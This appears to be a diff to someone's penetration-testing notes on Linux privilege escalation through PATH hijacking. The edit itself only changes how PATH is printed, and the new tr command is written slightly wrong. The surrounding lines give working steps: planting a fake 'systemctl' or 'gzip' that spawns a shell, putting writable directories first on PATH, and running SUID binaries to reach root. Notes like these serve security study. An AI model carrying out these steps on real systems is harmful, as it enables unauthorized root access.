@@ -22,7 +22,7 @@ Path Injecting Rootbash
 echo -e '#!/bin/sh' > /dev/shm/systemctl  
 echo -e '/bin/sh' >> /dev/shm/systemctl  
 chmod +x /dev/shm/systemctl                          
-echo $PATH
+echo $PATH | tr ':''\n'
 export PATH=/dev/shm:$PATH
 ./zabbix-service 
 
@@ -57,7 +57,7 @@ gzip -c /var/log/apache2/access.log > blah,blah,access.gz
 gzip is not full-path
 
 which gzip /bin/gzip 
-echo $PATH
+echo $PATH | tr ':''\n'
 export PATH=.:$PATH 
 export PATH=/tmp:$PATH
 echo $PATH .:/usr/local/sbin:/usr/local/bin 
@@ -114,7 +114,7 @@ int main() {
 
 gcc -o service service.c 
 
-echo $PATH
+echo $PATH | tr ':''\n'
 export PATH=.:$PATH
 /usr/bin/kick 
 root! 
